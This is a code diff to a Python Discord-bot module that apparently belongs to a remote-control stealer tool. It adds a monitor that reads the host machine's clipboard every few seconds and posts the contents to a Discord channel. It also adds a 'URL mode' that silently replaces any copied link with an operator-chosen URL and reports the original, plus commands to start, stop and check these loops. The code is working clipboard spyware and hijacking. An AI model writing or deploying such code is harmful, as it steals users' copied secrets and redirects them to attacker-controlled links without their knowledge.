@@ -131,7 +131,6 @@ class clipboard_cog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
         self.previous_clipboard = self.get_clipboard()
-        self.clipboard_monitor_url.start("https://rickroll.it")
 
     def cog_unload(self) -> None:
         self.clipboard_monitor.stop()
@@ -156,31 +155,54 @@ class clipboard_cog(commands.Cog):
             return clipboard
         else:
             return 1
+        
+    async def check_clipboard(self):
+        try:
+            clipboard = self.get_clipboard()
+        except Exception as e:
+            print(e)
+            return None
+
+        if hash(clipboard) != hash(self.previous_clipboard):
+            self.previous_clipboard = clipboard
+            return clipboard
+        else:
+            return None
 
     @tasks.loop(seconds=3)
     async def clipboard_monitor(self, ctx):
-        clipboard = self.check_clipboard()
-        if clipboard != 1:
-            if len(clipboard) > 6000:
-                embed = embed_data(
-                    title="Clipboard monitor",
-                    description="Clipboard contents was too long",
-                    color=discord.Color.red()
-                    )
-                await ctx.send(embed=embed)
-            else:
-                embed = embed_data(
-                    title="Extracted clipboard contents | Monitor mode",
-                    data=clipboard
-                    )
-                await ctx.send(embed=embed)
+        clipboard = await self.check_clipboard()
+        if clipboard:
+            await self.send_clipboard_content(ctx, clipboard)
 
     @tasks.loop(seconds=1)
-    async def clipboard_monitor_url(self, url):
-        clipboard = self.check_clipboard()
-        if clipboard != 1:
-            if any(item in clipboard for item in ["http://", "https://", ".com", ".net", ".org", "www."]):
+    async def clipboard_monitor_url(self, ctx, url):
+        clipboard = await self.check_clipboard()
+        if clipboard and any(item in clipboard for item in ["http://", "https://", ".com", ".net", ".org", "www."]):
+            if clipboard != url:
                 self.set_clipboard(url)
+                await self.send_clipboard_content(ctx, clipboard, switched_url=url)
+
+        elif clipboard != None:
+            await self.send_clipboard_content(ctx, clipboard)
+
+    async def send_clipboard_content(self, ctx, clipboard, switched_url=None):
+        if len(clipboard) > 6000:
+            embed = discord.Embed(
+                title="Clipboard monitor",
+                description="Clipboard contents were too long",
+                color=discord.Color.red()
+            )
+        else:
+            embed = discord.Embed(
+                title="Extracted clipboard contents",
+                color=discord.Color.green()
+            )
+            embed.add_field(name="Contents:", value=f"`{clipboard}`", inline=False)
+            if switched_url:
+                embed.add_field(name="Switched out to:", value=f"`{switched_url}`", inline=False)
+        
+        await ctx.send(embed=embed)
 
 
     @commands.group(name="clipboard", invoke_without_command=True)
@@ -222,6 +244,44 @@ class clipboard_cog(commands.Cog):
         embed = embed_data(
             title="Clipboard monitor status",
             description=f"Clipboard monitor is: **{status}**",
+            color=color)
+        await ctx.send(embed=embed)
+    
+    @monitor.group(name="url", invoke_without_command=True)
+    async def url(self,ctx):
+        await ctx.send("see help menu for monitor mode")
+
+    @url.command(name="start")
+    async def start_url(self, ctx, url):
+        self.clipboard_monitor_url.start(ctx, url)
+        embed = embed_data(
+            title="Clipboard monitor URL started",
+            description="Clipboard monitor mode was started in URL mode, disable with `clipboard monitor url stop`"
+            )
+        await ctx.send(embed=embed)
+
+    @url.command(name="stop")
+    async def stop_url(self, ctx):
+        self.clipboard_monitor.stop()
+        embed = embed_data(
+            title="Clipboard monitor URL stopped",
+            description="Clipboard monitor mode URL was stopped, restart with `clipboard monitor url start`",
+            color=discord.Color.red()
+            )
+        await ctx.send(embed=embed)
+
+    @url.command(name="status")
+    async def status_url(self, ctx):
+        if self.clipboard_monitor_url.is_running():
+            status = "Running"
+            color = discord.Color.green()
+        else:
+            status = "Stopped"
+            color = discord.Color.red()
+
+        embed = embed_data(
+            title="Clipboard monitor URL status",
+            description=f"Clipboard monitor in URL mode is: **{status}**",
             color=color)
         await ctx.send(embed=embed)
 
